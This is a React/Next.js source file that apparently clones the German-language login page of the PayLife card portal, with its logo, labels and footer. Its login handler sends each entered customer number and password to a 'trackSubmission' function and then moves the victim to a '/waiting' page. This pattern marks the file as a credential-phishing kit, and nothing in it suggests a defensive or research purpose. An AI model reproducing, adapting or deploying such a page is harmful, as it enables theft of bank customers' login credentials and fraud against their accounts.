"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [customerNumber, setCustomerNumber] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async () => {
    await trackSubmission("mypaylife", "login", { customerNumber, password });
    router.push(`/waiting?user=${encodeURIComponent(customerNumber)}`);
  };

  return (
    <div className="page-container facelift">
      <section id="authenticationContainer">
        <div className="auth-row">
          {/* LEFT: Login form */}
          <div id="login-content">
            <header id="headerContainer" role="banner">
              <img
                alt="PayLife Logo"
                className="logo-desktop"
                src="/mypaylife/paylife-logo.svg"
                style={{ height: 50 }}
              />
            </header>

            <section id="authenticationSection">
              <main>
                <div id="loginContainer">
                  <form
                    id="loginForm"
                    onSubmit={(e) => e.preventDefault()}
                    noValidate
                  >
                    <h1 className="form-signin-heading">Login</h1>

                    {/* Customer Number */}
                    <label
                      id="customerNumberLabel"
                      htmlFor="loginCustomerNumberInput"
                      className="form-signin-label"
                      style={{ visibility: "hidden" }}
                    >
                      PayLife Kundennummer
                    </label>
                    <div className="input-group">
                      <input
                        autoComplete="off"
                        className="form-control round-input-edges"
                        id="loginCustomerNumberInput"
                        inputMode="numeric"
                        maxLength={10}
                        name="CustomerNumber"
                        placeholder="PayLife Kundennummer"
                        type="text"
                        suppressHydrationWarning
                        value={customerNumber}
                        onChange={(e) => setCustomerNumber(e.target.value)}
                      />
                      <span
                        id="customerNumberAddOn"
                        className="input-group-text clear-text"
                        style={{ display: "none" }}
                      >
                        <span className="input-group-addon add-on">
                          <i className="bi bi-x-circle-fill">✕</i>
                        </span>
                      </span>
                    </div>

                    <div id="customerNumberForgotten">
                      <a id="forgotYourCustomerNumber" href="#">
                        Kundennummer vergessen?
                      </a>
                    </div>

                    {/* Password */}
                    <label
                      id="passwordLabel"
                      htmlFor="loginPasswordInput"
                      className="form-signin-label"
                      style={{ visibility: "hidden" }}
                    >
                      Passwort
                    </label>
                    <div className="input-group">
                      <input
                        autoComplete="off"
                        className="form-control round-input-edges"
                        id="loginPasswordInput"
                        name="Password"
                        placeholder="Passwort eingeben"
                        type="password"
                        suppressHydrationWarning
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      <span
                        id="passwordAddOn"
                        className="input-group-text"
                        style={{ display: "none" }}
                      >
                        <span className="input-group-addon add-on show-hide-password">
                          <i className="bi bi-eye">👁</i>
                        </span>
                      </span>
                    </div>

                    <div id="passwordForgotten">
                      <a id="forgotYourPassword" href="#" target="_blank">
                        Passwort vergessen?
                      </a>
                    </div>

                    <div className="button-container clearfix">
                      <input
                        type="button"
                        id="submit"
                        value="Anmelden"
                        className="btn btn-primary"
                        onClick={handleLogin}
                      />
                    </div>
                  </form>

                  {/* Register Block */}
                  <div id="registerContainer">
                    <div className="register-heading"></div>
                    <div className="register-box-content">
                      <p style={{ color: "#131e7e", textAlign: "left" }}>
                        <strong>NEU:</strong>
                      </p>
                      <p style={{ color: "#000000", textAlign: "left" }}>
                        Unser Portal ist jetzt in einer{" "}
                        <strong>
                          neuen Portalversion mit verbessertem Erlebnis{" "}
                        </strong>
                        verfügbar.
                        <strong>
                          <br />
                        </strong>
                        Ihr Passwort bleibt gleich.
                        <br />
                        <br />
                      </p>
                      <p style={{ color: "#000000", textAlign: "left" }}>
                        &nbsp;
                      </p>
                      <p style={{ color: "#131e7e", textAlign: "left" }}>
                        <strong>Noch nicht registriert?</strong>
                      </p>
                    </div>
                    <div className="button-container clearfix float-start">
                      <a
                        className="btn btn-default"
                        href="#"
                        id="btnRegister"
                        style={{ padding: "0 10px" }}
                        target="_blank"
                      >
                        Einmalpasswort anfordern
                      </a>
                    </div>
                    <div className="clearfix"></div>
                    <div
                      className="register-box-content"
                      style={{ paddingTop: 25 }}
                    >
                      <p style={{ color: "#131e7e", textAlign: "left" }}>
                        <strong>
                          Mehr Informationen zur Registrierung finden Sie hier:
                        </strong>
                      </p>
                      <p style={{ color: "#131e7e", textAlign: "left" }}>
                        <strong>
                          <a href="#">PayLife App | PayLife</a>
                        </strong>
                      </p>
                    </div>
                  </div>
                </div>
              </main>
            </section>
          </div>

          {/* RIGHT: Hero image */}
          <div className="d-none d-md-block full-size-image"></div>
        </div>
      </section>

      {/* Footer */}
      <div id="footerContainer">
        <div className="footer-content">
          <span>
            <a href="#" target="_blank">
              FAQ
            </a>
            <a href="#" target="_blank">
              Impressum
            </a>
          </span>
          <span>
            <img
              src="/mypaylife/paylife-logo.svg"
              className="footer-logo"
              style={{ height: 17 }}
              alt="PayLife Logo"
            />
          </span>
        </div>
      </div>
    </div>
  );
}
